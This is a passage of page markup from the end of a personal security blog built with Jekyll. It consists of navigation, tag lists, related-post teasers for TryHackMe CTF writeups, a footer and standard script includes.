aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/brooklyn-nine-nine-writeup-tryhackme/">Brooklyn Nine Nine Writeup | TryHackMe</a><li><a href="/posts/ejpt-cheatsheet/">eJPT Cheatsheet</a><li><a href="/posts/internal-writeup-tryhackme/">Internal Writeup | TryHackMe</a><li><a href="/posts/alfred-writeup-tryhackme/">Alfred Writeup | TryHackMe</a><li><a href="/posts/hackpark-writeup-tryhackme/">HackPark Writeup | TryHackMe</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/basic-pentesting-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1642118400" data-df="ll" > Jan 14, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Basic Pentesting Writeup | TryHackMe</h3><div class="text-muted small"><p> CTF Overview Welcome to the writeup for the Basic Pentesting CTF. In this box, you will learn how to do the following: Service enumeration Brute forcing Hash cracking Linux enumeration ...</p></div></div></a></div><div class="card"> <a href="/posts/cicada-3301-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1642291200" data-df="ll" > Jan 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cicada 3301 Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the Cicada 3301 Vol. 1 CTF. This challenge is based on the same real-life internet puzzle by the same name. This challenge uses a mix of intermediate steganograph...</p></div></div></a></div><div class="card"> <a href="/posts/internal-writeup-tryhackme/"><div class="card-body"> <em class="small" data-ts="1642809600" data-df="ll" > Jan 22, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Internal Writeup | TryHackMe</h3><div class="text-muted small"><p> Overview This is my writeup for the Internal room on TryHackMe. Similar to the Relevant room, this room is not guided, so enumeration is key. In order to gain root, you must know how to exploit ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/steel-mountain-writeup-tryhackme/" class="btn btn-outline-primary" prompt="Older"><p>Steel Mountain Writeup | TryHackMe</p></a> <a href="/posts/wonderland-writeup-tryhackme/" class="btn btn-outline-primary" prompt="Newer"><p>Wonderland Writeup | TryHackMe</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/0xv3r4x">v3r4x</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/security/">security</a> <a class="post-tag" href="/tags/beginner/">beginner</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/windows/">windows</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
